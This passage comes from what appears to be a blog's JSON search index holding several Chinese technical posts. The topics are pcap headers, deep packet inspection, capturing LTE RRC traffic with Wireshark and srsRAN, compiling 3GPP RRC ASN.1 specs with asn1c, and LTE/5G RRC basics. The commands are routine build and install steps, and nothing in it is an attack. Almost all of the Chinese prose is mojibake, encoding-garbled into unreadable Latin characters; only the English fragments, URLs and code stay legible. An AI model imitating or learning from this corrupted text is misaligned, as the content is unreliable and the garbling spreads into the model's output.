00ï¼Œè®¡ç®—æœºè¯»çš„æ˜¯ï¼š00 08 2A 4Fï¼Œåè¿›åˆ¶ï¼š535119ï¼Œä»£è¡¨535119msï¼› Caplen(4B)ï¼š BA 1C 00 00, è®¡ç®—æœºè¯»çš„æ˜¯ï¼š00 00 1C BAï¼Œåè¿›åˆ¶ï¼š7354ï¼Œä»£è¡¨åé¢çš„7354ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªæ•°æ®å¸§ï¼Œä¹‹ååˆæ˜¯ä¸€ä¸ªæ–°çš„PacketHeaderï¼Œå¦‚ æ­¤å¾ªç¯ï¼› Len(4B)ï¼š BA 1C 00 00ï¼Œå’ŒCaplenç›¸åŒ","categories":[{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/"},{"name":"Wireshark","slug":"ç¬”è®°/Wireshark","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/Wireshark/"}],"tags":[{"name":"Pcap","slug":"Pcap","permalink":"https://www.sizaif.com/tags/Pcap/"}],"author":"sizaif"},{"title":"Deep Packet Inspection,DPI","slug":"Deep-Packet-Inspection-DPI","date":"2021-10-31T09:10:18.000Z","updated":"2021-10-31T09:41:54.000Z","comments":true,"path":"posts/ac712918/","link":"","permalink":"https://www.sizaif.com/posts/ac712918/","excerpt":"","text":"ä»€ä¹ˆæ˜¯DPI? Deep packet inspection,DPI ä¹Ÿè¢«å«åšä¿¡æ¯æå–,IXæˆ–å®Œæ•´çš„æ•°æ®åŒ…æ£€æŸ¥. æ˜¯ä¸€ç§ç½‘ç»œæ•°æ®åŒ…è¿‡æ»¤. æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥æ˜¯å¯¹é€šè¿‡æ£€æŸ¥ç‚¹ä¼ è¾“çš„æŠ¥æ–‡çš„æ•°æ®éƒ¨åˆ†å’ŒæŠ¥æ–‡å¤´è¿›è¡Œè¯„ä¼°ï¼Œæ’é™¤ä»»ä½•ä¸ç¬¦åˆåè®®ã€åƒåœ¾é‚®ä»¶ã€ç—…æ¯’ã€å…¥ä¾µå’Œä»»ä½•å…¶ä»–é˜»æ­¢æŠ¥æ–‡é€šè¿‡æ£€æŸ¥ç‚¹çš„å®šä¹‰æ ‡å‡†ã€‚ æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥ä¹Ÿç”¨äºç¡®å®šç‰¹å®šæ•°æ®åŒ…æ˜¯å¦è¢«é‡å®šå‘åˆ°å¦ä¸€ä¸ªç›®çš„åœ°ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ·±åº¦æ•°æ®åŒ…æ£€æŸ¥èƒ½å¤Ÿå®šä½ã€æ£€æµ‹ã€åˆ†ç±»ã€é˜»å¡æˆ–é‡è·¯ç”±å…·æœ‰ç‰¹å®šä»£ç æˆ–æ•°æ®è´Ÿè½½çš„åŒ…ï¼Œè¿™äº›åŒ…æ˜¯ä¼ ç»ŸåŒ…è¿‡æ»¤æ— æ³•æ£€æµ‹ã€å®šä½ã€åˆ†ç±»ã€é˜»å¡æˆ–é‡å®šå‘çš„ã€‚ä¸æ™®é€šæ•°æ®åŒ…è¿‡æ»¤ä¸åŒï¼Œæ·±åº¦æ•°æ®åŒ…æ£€æŸ¥ä¸ä»…ä»…æ˜¯æ£€æŸ¥åŒ…å¤´ DPI æ€æ ·å·¥ä½œ? æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥æ˜¯åŒ…è¿‡æ»¤çš„ä¸€ç§å½¢å¼ï¼Œé€šå¸¸ä½œä¸ºé˜²ç«å¢™çš„åŠŸèƒ½æ‰§è¡Œã€‚å®ƒè¢«åº”ç”¨äºå¼€æ”¾ç³»ç»Ÿäº’è¿çš„åº”ç”¨å±‚ã€‚ æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥æ˜¯å¯¹é€šè¿‡æ£€æŸ¥ç‚¹çš„åŒ…çš„å†…å®¹è¿›è¡Œè¯„ä¼°ã€‚ä½¿ç”¨ç”±ä½ ã€InternetæœåŠ¡æä¾›å•†æˆ–ç½‘ç»œæˆ–ç³»ç»Ÿç®¡ç†å‘˜åˆ†é…çš„è§„åˆ™ï¼Œæ·±åº¦åŒ…æ£€æŸ¥ç¡®å®šå¦‚ä½•å®æ—¶å¤„ç†è¿™äº›åŒ… æ·±åº¦æ•°æ®åŒ…æ£€æŸ¥èƒ½å¤Ÿæ£€æŸ¥è¿™äº›åŒ…çš„å†…å®¹ï¼Œç„¶åæ‰¾å‡ºå®ƒæ¥è‡ªå“ªé‡Œï¼Œæ¯”å¦‚å‘é€å®ƒçš„æœåŠ¡æˆ–åº”ç”¨ç¨‹åºã€‚æ­¤å¤–ï¼Œå®ƒè¿˜å¯ä»¥ä¸è¿‡æ»¤å™¨ä¸€èµ·å·¥ä½œï¼Œä»¥ä¾¿ä»åœ¨çº¿æœåŠ¡(å¦‚Twitteræˆ–Facebook)æˆ–ç‰¹å®šIPåœ°å€æŸ¥æ‰¾å’Œé‡å®šå‘ç½‘ç»œæµé‡ DPI VS ä¼ ç»ŸåŒ…è¿‡æ»¤ ä¼ ç»Ÿçš„åŒ…è¿‡æ»¤åªè¯»å–æ¯ä¸ªåŒ…çš„å¤´ä¿¡æ¯ã€‚è¿™æ˜¯ä¸€ç§åŸºæœ¬æ–¹æ³•ï¼Œä¸»è¦ç”±äºå½“æ—¶çš„æŠ€æœ¯é™åˆ¶è€Œæ²¡æœ‰ç°ä»£æ•°æ®åŒ…è¿‡æ»¤æ–¹æ³•å¤æ‚ã€‚é˜²ç«å¢™çš„å¤„ç†èƒ½åŠ›éå¸¸ä½ï¼Œä¸è¶³ä»¥å¤„ç†å¤§é‡æ•°æ®åŒ…ã€‚æ¢å¥è¯è¯´ï¼Œä¼ ç»Ÿçš„æ•°æ®åŒ…è¿‡æ»¤ç±»ä¼¼äºé˜…è¯»ä¸€æœ¬ä¹¦çš„ä¹¦åï¼Œè€Œä¸çŸ¥é“æˆ–è¯„ä¼°å°é¢å†…çš„å†…å®¹ã€‚ éšç€æ–°æŠ€æœ¯çš„å‡ºç°ï¼Œæ·±åº¦æ•°æ®åŒ…æ£€æµ‹å˜å¾—å¯è¡Œã€‚éšç€å®ƒå˜å¾—æ›´åŠ å½»åº•å’Œå®Œæ•´ï¼Œå®ƒå˜å¾—æ›´åƒæ˜¯æ‹¿èµ·ä¸€æœ¬ä¹¦ï¼Œæ‰“å¼€å®ƒï¼Œä»å¤´åˆ°å°¾é˜…è¯»ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"}],"tags":[{"name":"DPI","slug":"DPI","permalink":"https://www.sizaif.com/tags/DPI/"}],"author":"sizaif"},{"title":"ä½¿ç”¨WiresharkæŠ“åŒ…LTE RRC","slug":"ä½¿ç”¨WiresharkæŠ“åŒ…LTE-RRC","date":"2021-10-07T08:18:15.000Z","updated":"2021-10-07T08:47:24.850Z","comments":true,"path":"posts/172b8d62/","link":"","permalink":"https://www.sizaif.com/posts/172b8d62/","excerpt":"","text":"[TOC] ä½¿ç”¨WiresharkæŠ“åŒ…LTE RRC åŒ… å®éªŒç¯å¢ƒè¯´æ˜ ä¸€å°ubuntu20.04è™šæ‹Ÿæœº Wireshark åŸºäºsrsRAN æ¨¡æ‹ŸLTEç¯å¢ƒ ä½¿ç”¨ZeroMQ RF å®ç°æ— RFç¡¬ä»¶æ„å»ºsrsUEä¸srsENB é€šä¿¡ With srsRAN this can be achieved by replacing the radio link between eNodeB and UE with a mechanism that allows to exchange baseband IQ samples over an alternative transport. For this purpose, weâ€™ve implemented a ZeroMQ-based RF driver that essentially acts as a transmit and receive pipe for exchanging IQ samples over TCP or IPC. Wiresharké…ç½® åœ¨srsran doc æ–‡æ¡£ä¸­ç”±æåˆ°wireshark æŠ“å–ç”¨æ³• Examining PCAPs with Wireshark æ‰“å¼€DLT_Useré€‰é¡¹ æ·»åŠ é…ç½® ä¿å­˜åå³å¯å¼€å§‹æŠ“å–, æŒ‰ç…§åŸæ–‡çš„æ„æ€è®¾ç½®æ­¤é¡¹åå°±å¯ä»¥æŠ“å–åˆ°LTEæ¶ˆæ¯. ä½†åœ¨ä½¿ç”¨ZeroMQ å®ç°å…RFä¸­å¹¶æ²¡æœ‰å‡ºç°ä¸Šè¿°çš„æƒ…å†µ, å› ä¸ºZeroMQçš„æµé‡éƒ½æ˜¯é€šè¿‡localhost:2000 å’Œ localhost:2001 ç«¯å£ å®ç°æµé‡äº¤æ¢ æ—¢ç„¶å¦‚æ­¤,å°è¯•æ·»åŠ è§£æé€‰é¡¹ åˆ†æ-&gt; è§£ç ä¸º, æ·»åŠ å¯¹åº”ç«¯å£, ä»¥åŠè¦è§£ææˆçš„åè®®,ä¿å­˜å³å¯ srsRANé…ç½® åœ¨~/.config/srsran/ ç›®å½•ä¸‹, ä¿®æ”¹epc.conf, enb.conf,ue.conf æ–‡ä»¶ åœ¨å¯¹åº”çš„pcap é€‰é¡¹ä¸‹, è®¾ç½® enable = true å½“è¿è¡Œå®Œæˆå,å³å¯ä»¥ç”¨wireshark æ‰“å¼€ /tmp/ç›®å½•ä¸‹å¯¹åº”çš„pcapæ–‡ä»¶, è®¾ç½®å¯¹åº”è§£ææŸ¥çœ‹","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"LTE","slug":"æŠ€æœ¯å‘/LTE","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/LTE/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://www.sizaif.com/tags/LTE/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://www.sizaif.com/tags/Wireshark/"}],"author":"sizaif"},{"title":"æå–3GPP TSä¸­RRC ASN.1æ¨¡å¼åŠç¼–è¯‘","slug":"æå–3GPP-TSä¸­RRC-ASN-1æ¨¡å¼åŠç¼–è¯‘","date":"2021-10-05T03:30:26.000Z","updated":"2021-10-06T08:53:55.000Z","comments":true,"path":"posts/b0e1c2b9/","link":"","permalink":"https://www.sizaif.com/posts/b0e1c2b9/","excerpt":"","text":"æ•´ä½“æµç¨‹å›¾ ASN.1 æ ‡å‡†ç®€ä»‹ åœ¨ç”µä¿¡å’Œè®¡ç®—æœºç½‘ç»œé¢†åŸŸï¼ŒASN.1ï¼ˆAbstract Syntax Notation One) æ˜¯ä¸€å¥—æ ‡å‡†ï¼Œæ˜¯æè¿°æ•°æ®ã€ç¼–ç ã€ä¼ è¾“ã€è§£ç çš„çµæ´»çš„æŠ½è±¡è¯­ä¹‰è®°æ³•ã€‚å®ƒæä¾›äº†ä¸€å¥—æ­£å¼ã€æ— æ­§ä¹‰å’Œç²¾ç¡®çš„è§„åˆ™ä»¥æè¿°ç‹¬ç«‹äºç‰¹å®šè®¡ç®—æœºç¡¬ä»¶çš„å¯¹è±¡ç»“æ„ã€‚ 3GPPåè®® 5G NR çš„æ— çº¿èµ„æºæ§åˆ¶(RRC)åè®®æ˜¯ 38.331 38.331https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=3197 LTE çš„æ— çº¿èµ„æºæ§åˆ¶(RRC)åè®®æ˜¯ 36.331 36.331https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=2440 æå–RRC,ASN1æ ·å¼ è½¬æ¢å·¥å…·ä¸‹è½½ å°†ä¸‹è½½åçš„3GPPåè®®Word æ–‡æ¡£å»æ‰é¡µçœ‰é¡µè„šåè½¬æ¢æˆçº¯æ–‡æœ¬txt, ç¼–ç é€‰æ‹©UTF-8 ä½¿ç”¨txt2asn1 è½¬æ¢ txt2asn1https://github.com/Dybinx/txt2asn1 è¯·ä¸‹è½½ZIPæ ¼å¼å¹¶è§£å‹,é¿å…å‡ºç°exeæƒé™æ— æ³•è¿è¡Œé—®é¢˜ åœ¨åŒç›®å½•ä¸‹ç»ˆç«¯è¿è¡Œ å¾—åˆ°xxx.asn1æ–‡ä»¶ ./txt2asn1.exe XXX.txt ä½¿ç”¨extract_asn1_from_spec.pl extract_asn1_from_spechttps://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/master/openair2/RRC/LTE/MESSAGES/asn1c/ASN1_files/extract_asn1_from_spec.pl ä¸‹è½½æ–‡ä»¶å, æºæ–‡ä»¶åŒç›®å½•ç»ˆç«¯è¿è¡Œ perl extract_asn1_from_spec xxxx.txt å¾—åˆ° EUTRA-RRC-Definitions.asn, EUTRA-UE-Variables.asn ,EUTRA-InterNodeDefinitions ä¸‰ä¸ªæ–‡ä»¶ ASN1Cç¼–è¯‘ASN.1æ–‡ä»¶ ASN1C æ˜¯å°† ASN.1 è§„èŒƒè½¬æ¢ä¸º C æºä»£ç çš„å…è´¹å¼€æºç¼–è¯‘å™¨ã€‚ å®ƒæ”¯æŒä¸€ç³»åˆ— ASN.1 è¯­æ³•ï¼ŒåŒ…æ‹¬ ISO/IEC/ITU ASN.1 1988ã€'94ã€'97ã€2002 å’Œä»¥åçš„ä¿®æ­£ã€‚ æ”¯æŒçš„ç¼–ç è§„åˆ™é›†æ˜¯ BER: ITU-T Rec. X.690 | ISO/IEC 8825-1 (2002) (BER/DER/CER) PER: X.691|8825-2 (2002) (PER). XER: X.693|8825-3 (2001) (BASIC-XER/CXER). asn1cå®˜ç½‘http://www.lionet.info/asn1c/ asn1cæºç https://github.com/vlm/asn1c ubuntu å¯ç›´æ¥é€šè¿‡ sudo apt-get install asn1c è¿›è¡Œå®‰è£… sudo apt update sudo apt install asn1c ä½¿ç”¨asn1c ç¼–è¯‘ asn1c -S /usr/share/asn1c -fcompound-names -gen-PER -pdu=auto 36331-f40.asn1 # -pdu=auto äº§ç”Ÿpdu_colletion.cæ–‡ä»¶ # -fcompound-names å»é™¤é‡å®šä¹‰ # -gen-PER ä½¿ç”¨PERç¼–ç  # -S /usr/share/asn1c æŒ‡å®šasn1cåº“æ–‡ä»¶ä½ç½®, é€šè¿‡ä½¿ç”¨whereis asn1cå‘½ä»¤æŸ¥çœ‹å…¶åº“ä½ç½® FAQ Q.: Does asn1c support BER encoding? I see only DER encoding in documentation.A.: Yes, the asn1c compiler fully supports BER encoding. Any DER encoded data is, by definition, a valid BER data, from the receiverâ€™s point of view.If you want data to be BER or DER encoded, just invoke der_encode().Q.: My linker complains: Undefined symbols: _asn_DEF_PDU.A.: If you have your own file with main() routine, just delete the converter-sample.cfile, you wonâ€™t need it. If you havenâ€™t created the main() routine yourself and wish to rely on converter-sample.c for your transcoding needs, add -DPDU=YourPdu to the list of compiler flags.Q.: How to compile the 3GPP Radio Resource Control specification?A.: The asn1c distribution includes an RRC 25.331 (version 7.1.0) example, check out https://github.com/vlm/asn1c/tree/master/examples/sample.source.RRC. You can also use the pre-compiled rrc-dump.exe program, which is part of Windows ASN.1 compiler installer.Q.: How to compile the ISO 13522 (MHEG-5) specification?A.: The ASN.1 compiler comes with a MHEG-5 decoder. Follow the https://github.com/vlm/asn1c/tree/master/examples/sample.source.MHEG5 README file instructions. You can also use the pre-compiled mheg5dump.exe program, which is part of Windows ASN.1 compiler installer.Q.: How to compile the XYZ decoder?A.: If XYZ is one of MEGACO (Media Gateway Control), PKIX1/X.509, LDAP, GSM TAP3 or OAM ULP, just go to examples/sample.source.XYZ and run make. The Windows ASN.1 compiler installer already contains the pre-compiled decoders for these encoding formats.If you have something else, you should either use the Online ASN.1 compiler, or download the ASN.1 compiler source code. å¦‚æœä¸ä½¿ç”¨è‡ªå·±çš„main()å‡½æ•°, ç›´æ¥ä½¿ç”¨converter-sample.cçš„åŒ–, éœ€è¦åœ¨å…¶ä¸­æ·»åŠ ä¸€ä¸ªç›®æ ‡PDU #include &lt;asn_application.h&gt; #include &lt;asn_internal.h&gt; &#x2F;* for ASN__DEFAULT_STACK_MAX *&#x2F; #define PDU BCCH_BCH_Message &#x2F;* Convert &quot;Type&quot; defined by -DPDU into &quot;asn_DEF_Type&quot; *&#x2F; #define ASN_DEF_PDU(t) asn_DEF_ ## t #define DEF_PDU_Type(t) ASN_DEF_PDU(t) #define PDU_Type DEF_PDU_Type(PDU) æˆ–è€…åœ¨Makefile.am.sample æ–‡ä»¶ä¸­, ä¿®æ”¹ CFLAGS æ·»åŠ  -DPDU= é€‰é¡¹ CFLAGS += -DHAVE_CONFIG_H -DJUNKTEST -D_DEFAULT_SOURCE -DPDU=BCCH_BCH_Message -DASN_PDU_COLLECTION -I. OBJS=$&#123;ASN_MODULE_SRCS:.c=.o&#125; $&#123;ASN_CONVERTER_SOURCES:.c=.o&#125; all: $(TARGET) $(TARGET): $&#123;OBJS&#125; $(CC) $(CFLAGS) -o $(TARGET) $&#123;OBJS&#125; $(LDFLAGS) $(LIBS)","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"LTE","slug":"æŠ€æœ¯å‘/LTE","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/LTE/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://www.sizaif.com/tags/LTE/"},{"name":"ASN.1","slug":"ASN-1","permalink":"https://www.sizaif.com/tags/ASN-1/"}],"author":"sizaif"},{"title":"LTE åŸºç¡€çŸ¥è¯†","slug":"LTE-åŸºç¡€çŸ¥è¯†","date":"2021-10-04T03:06:13.000Z","updated":"2021-10-05T04:01:19.000Z","comments":true,"path":"posts/cdac3e0/","link":"","permalink":"https://www.sizaif.com/posts/cdac3e0/","excerpt":"","text":"LTEç›¸å…³åŸºç¡€çŸ¥è¯† LTEæ¶æ„ ç¬¬ä¸€å±‚ç‰©ç†å±‚(PHY),åœ¨æ—¶é—´å’Œé¢‘ç‡åŸŸä½¿ç”¨æ— çº¿ç”µèµ„æºè¿›è¡Œé€šä¿¡ã€‚ ç¬¬äºŒå±‚ç”±ä»‹è´¨è®¿é—®æ§åˆ¶(MAC)ã€æ— çº¿é“¾è·¯æ§åˆ¶(RLC)ã€åˆ†ç»„æ•°æ®æ”¶æ•›åè®®(PDCP)ä¸‰å±‚ç»„æˆã€‚å®ƒä»¬æ”¯æŒä¸Šè¡Œå’Œä¸‹è¡Œè°ƒåº¦ã€åˆ†ç»„åˆ†å‰²ã€åŠ å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤ç­‰åŠŸèƒ½ã€‚ RRCæ˜¯ä¸€ä¸ªç¬¬ä¸‰å±‚åè®®ï¼Œè´Ÿè´£åˆ›å»ºå’Œç»´æŠ¤æ— çº¿ç”µè¿æ¥ã€å¹¿æ’­ç³»ç»Ÿä¿¡æ¯ã€å‘é€åˆ†é¡µé€šçŸ¥ã€é…ç½®å’ŒæŠ¥å‘Šæ— çº¿ç”µæµ‹é‡ä»¥åŠéš§é“åŒ–NASæ¶ˆæ¯ã€‚ NASæ˜¯ç»ˆç«¯ä¸CNä¹‹é—´çš„æ§åˆ¶å¹³é¢åè®®;å®ƒè´Ÿè´£è®¾ç½®å®‰å…¨æ€§ï¼Œå¤„ç†ç§»åŠ¨æ€§å’Œä¼šè¯ç®¡ç†ã€‚ UEä»£è¡¨æ‰‹æœº; RANä¸ºç»ˆç«¯æä¾›æ— çº¿é€šä¿¡æœåŠ¡; CN(EPC)(åŒ…æ‹¬å…¶ä»–åŠŸèƒ½)åœ¨ç»ˆç«¯å’ŒInternetä¹‹é—´è·¯ç”±æ•°æ®ã€‚ RANç”±æ— çº¿åŸºç«™ç»„æˆï¼Œåœ¨5Gä¸­ç§°ä¸ºgNBï¼Œåœ¨4Gä¸­ç§°ä¸ºeNBã€‚gNBæ‰€ä½¿ç”¨çš„æ— çº¿ç”µæ¥å…¥æŠ€æœ¯è¢«ç§°ä¸ºæ–°æ— çº¿ç”µ(NR)ï¼Œ eNBæ‰€ä½¿ç”¨çš„æ— çº¿ç”µæ¥å…¥æŠ€æœ¯è¢«ç§°ä¸ºè¿›åŒ–é€šç”¨åœ°é¢æ— çº¿ç”µæ¥å…¥(E-UTRA)ã€‚ CNç”±å‡ ä¸ªç½‘ç»œåŠŸèƒ½ç»„æˆï¼Œå…¶ä¸­5Gçš„æ¥å…¥å’Œç§»åŠ¨æ€§ç®¡ç†åŠŸèƒ½(AMF)å’Œ4Gçš„ç§»åŠ¨æ€§ç®¡ç†å®ä½“(MME)å¦‚å›¾æ‰€ç¤ºã€‚UEåˆ°RAN/CNçš„æ–¹å‘ç§°ä¸ºä¸Šè¡Œï¼Œå¦ä¸€ä¸ªæ–¹å‘ç§°ä¸ºä¸‹è¡Œã€‚ 4Gå’Œ5Gçš„æµé‡æœ‰ä¸¤ç§ç±»å‹: ä¸€ç§ç§°ä¸ºæ§åˆ¶å¹³é¢çš„ç±»å‹è´Ÿè´£å»ºç«‹å’Œç»´æŠ¤è¿æ¥ï¼Œå¹¶å»ºç«‹å®‰å…¨æ€§; ç”¨æˆ·å¹³é¢: æ‰¿è½½å®é™…æ•°æ®ï¼Œå¦‚è¯­éŸ³é€šè¯å’Œäº’è”ç½‘æ•°æ®ã€‚æ¯ç§ç±»å‹éƒ½ç”±å‡ ä¸ªåè®®ç»„æˆã€‚ æ§åˆ¶å¹³é¢ä¸Šä½¿ç”¨çš„åè®®æ ˆçš„ç©ºä¸­æ¥å£,åŒ…æ‹¬æ— çº¿ç”µèµ„æºæ§åˆ¶åè®®(RRC)å’Œä¸å¯è®¿é—®å±‚åè®®(NAS)ï¼Œ RRC(Radio Resource Control) æ— çº¿èµ„æºæ§åˆ¶ RRCæ˜¯ä¸€ä¸ªç¬¬ä¸‰å±‚åè®®ï¼Œè´Ÿè´£åˆ›å»ºå’Œç»´æŠ¤æ— çº¿ç”µè¿æ¥ã€å¹¿æ’­ç³»ç»Ÿä¿¡æ¯ã€å‘é€åˆ†é¡µé€šçŸ¥ã€é…ç½®å’ŒæŠ¥å‘Šæ— çº¿ç”µæµ‹é‡ä»¥åŠéš§é“åŒ–NASæ¶ˆæ¯ã€‚ åœ¨NG-RANä¸­ï¼ŒRRCåœ¨UEå’ŒgNBä¹‹é—´çš„æ§åˆ¶å¹³é¢æ¶ˆæ¯ä¸­è¿›è¡Œæ“ä½œã€‚å®ƒæºå¸¦äº†ä¸RANæ§åˆ¶å¹³é¢ç¨‹åºç›¸å…³çš„ä¿¡æ¯ RRCå±‚è¿˜ä¸ºç»ˆç«¯å’Œæ ¸å¿ƒç½‘æ¥å…¥ç§»åŠ¨æ€§ç®¡ç†åŠŸèƒ½(Access and Mobility Management Function, AMF)ä¹‹é—´å‘é€çš„NASæ¶ˆæ¯æä¾›æœåŠ¡ã€‚ RRCä¸­çš„æ¶ˆæ¯ä¾èµ–äºPDCP,åœ¨å¿…è¦æ—¶æä¾›ä¸€ä¸ªå…·æœ‰åŠ å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤çš„é€šé“ã€‚ RRCè´Ÿè´£å¹¿æ’­ç³»ç»Ÿä¿¡æ¯æˆ–è·å–ç³»ç»Ÿä¿¡æ¯ä»¥ä¾¿åœ¨å°åŒºå†…è¿›è¡Œé€šä¿¡ï¼Œç”¨äºåœ¨RRC_IDLEçŠ¶æ€ä¸‹å‘é€å¯»å‘¼æ¶ˆæ¯ã€è¿æ¥ç®¡ç†ã€ç§»åŠ¨æ€§ç®¡ç†ç­‰ã€‚ RRCä¸‰ç§çŠ¶æ€è½¬æ¢ 5G NRä¸­ å¼•å…¥äº†é¢å¤–çš„çŠ¶æ€RRC_INACTIVE RRC_IDLE: ç½‘ç»œä¸åŒ…å«ç»ˆç«¯RRCè¿æ¥ä¿¡æ¯çš„çŠ¶æ€ã€‚å› æ­¤ï¼Œè®¾å¤‡ä¸èƒ½å‘é€æˆ–æ¥æ”¶æ•°æ®ã€‚è®¾å¤‡å®šæœŸé†’æ¥ï¼Œæ¥æ”¶æ¥è‡ªç½‘ç»œçš„å¯»å‘¼æ¶ˆæ¯ï¼Œå°†çŠ¶æ€æ›´æ”¹ä¸ºRRC_CONNECTEDã€‚å°åŒºå’Œç½‘ç»œä¹‹é—´çš„ç§»åŠ¨æ€§å¯ä»¥é€šè¿‡å°åŒºé‡æ–°é€‰æ‹©è¿‡ç¨‹å®ç° RRC_INACTIVE: æ— æ³•å‘é€æˆ–æ¥æ”¶æ•°æ®ã€‚ åœ¨UEå’ŒgNBä¸­éƒ½ç»´æŠ¤RRCä¸Šä¸‹æ–‡ã€‚UEå¯ä»¥ç±»ä¼¼äºRRC_IDLEæ¨¡å¼ä¼‘çœ ï¼Œä»¥èŠ‚çœç”µæ± ç”µé‡ã€‚å‡å°‘åˆ°RRC_CONNECTEDæ¨¡å¼çš„è½¬æ¢æ—¶é—´,ç”¨äºæ•°æ®ä¼ è¾“ï¼Œå› ä¸ºå·²ç»åœ¨æ ¸å¿ƒç½‘ç»œå»ºç«‹äº†ä¸Šä¸‹æ–‡ã€‚ é€šè¿‡å°åŒºé‡é€‰ç¨‹åºçš„ç§»åŠ¨æ€§ RRC_CONNECTED: åœ¨UEå’ŒgNBä¹‹é—´å»ºç«‹RRCä¸Šä¸‹æ–‡ï¼Œç”¨äºåœ¨ç½‘ç»œä¸Šä¼ è¾“æ•°æ®ã€‚é€šè¿‡å°åŒºæ— çº¿ç½‘ç»œä¸´æ—¶æ ‡è¯†ç¬¦(C-RNTI)ç”¨äºä¿¡ä»¤çš„ç½‘ç»œè¯†åˆ«è®¾å¤‡ã€‚ç”±RANç®¡ç†çš„ç§»åŠ¨æ€§ï¼Œåœ¨éœ€è¦æ—¶è¿›è¡Œåˆ‡æ¢ æ–°çš„çŠ¶æ€RRC_INACTIVEæœ‰åŠ©äºå‡å°‘å‘é€ç”¨æˆ·æ•°æ®ä¹‹å‰çš„çŠ¶æ€è½¬æ¢æ‰€æ¶‰åŠçš„ä¿¡ä»¤é‡ã€‚ RRC_INACTIVEå……å½“äº†ä¸€ä¸ªä¸­ä»‹çŠ¶æ€ï¼Œç”¨äºåœ¨RRCä¸Šä¸‹æ–‡å·²ç»å»ºç«‹æ—¶ç›´æ¥è½¬æ¢ã€‚åœ¨RRC_INACTIVEçŠ¶æ€ä¸‹ï¼Œè®¾å¤‡ä¼šåƒRRC_IDLEä¸€æ ·ä¼‘çœ ã€‚ RRCå±‚è´Ÿè´£æ§åˆ¶å¹³é¢è¿‡ç¨‹ä¸­çš„å¤§é‡æ¶ˆæ¯ï¼Œå¯¹äºä»»ä½•RRCå±‚çš„å®ç°æ¥è¯´ï¼Œå¥å£®åœ°æŠµå¾¡æ¶æ„æ”»å‡»å¹¶å‘ä¸Šå±‚æä¾›å¯é çš„æœåŠ¡éƒ½æ˜¯éå¸¸é‡è¦çš„ã€‚ RRCç»„æˆ RCæ¶ˆæ¯æ˜¯ä½¿ç”¨å¹³å°æ— å…³çš„ASN.1å®šä¹‰çš„ï¼Œå¯ä»¥çœ‹ä½œå›¾2ä¸­çš„æ ‘ã€‚æ¯ä¸ªRRCæ¶ˆæ¯ç”±ç»“æ„åŒ–çš„(SEQUENCE, SEQUENCE OF, CHOICE) å’ŒåŸè¯­(BOOLEAN,INTEGER, ENUMERATED,BIT STRING,OCTET STRING) æ•°æ®ç±»å‹, æ¯ä¸ªç»“æ„åŒ–æ•°æ®ç±»å‹å¯ä»¥è¿›ä¸€æ­¥ç”±ç»“æ„åŒ–æ•°æ®ç±»å‹å’ŒåŸºæœ¬æ•°æ®ç±»å‹ç»„æˆ. åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ï¼ŒRRCæ¶ˆæ¯ä½¿ç”¨Unaligned Packed Encoding Rules (UPER)[36]è¿›è¡Œç¼–ç ï¼Œè¯¥è§„åˆ™å°†æ•°æ®ç»“æ„è½¬æ¢ä¸ºç´§å‡‘çš„å­—èŠ‚åºåˆ—ã€‚ [36] ITU. Recommendation ITU-T X.691 International Standard 8825-2: Information technology â€“ ASN.1 encoding rules: Specification of Packed Encoding Rules (PER), Aug 2015. Available at https://www.itu.int/rec/T-REC-X.680-X.693-201508-I/en. RRC æ¶ˆæ¯ RRCå±‚åˆ©ç”¨åº•å±‚çš„æœåŠ¡å®ç°RRCæ¶ˆæ¯çš„å¯é ã€å®‰å…¨çš„ä¼ é€’ã€‚ä¸Šè¡Œé€šé“ä¸ºULCCCHã€UL-DCCHï¼Œä¸‹è¡Œé€šé“ä¸ºDL-CCCHã€DL-DCCHã€BCCHã€PCCHã€‚ CCCHã€PCCHå’ŒBCCHé€šé“ä¸­çš„æ¶ˆæ¯é€šè¿‡RLCä¸­çš„é€æ˜æ¨¡å¼â„¢ä»¥æ˜æ–‡å½¢å¼å‘é€ï¼Œç”¨äºåˆå§‹ASæ¿€æ´»å’Œéšæœºè®¿é—®è¿‡ç¨‹ã€‚å› æ­¤è¿™äº›æ¶ˆæ¯ä¸ä½¿ç”¨PDCPå±‚çš„æœåŠ¡è¿›è¡ŒåŠ å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤ã€‚RLCä»ç„¶æä¾›æ£€æµ‹åˆ°é”™è¯¯çš„é‡ä¼ å’ŒRRCæœ‰æ•ˆè´Ÿè½½çš„æ— é‡å¤äº¤ä»˜ã€‚åœ¨ä¸Šè¡Œé“¾è·¯ä¸­ï¼ŒRRCæŠ¥æ–‡åªé€šè¿‡UL-CCCHå’ŒUL-DCCHå‘é€ã€‚ 5G NR 5G New Radio Fuzzing Radio Resource Control messages in 5G and LTE systems 5Gç³»ç»Ÿæå‡ºæ–°çš„æ— 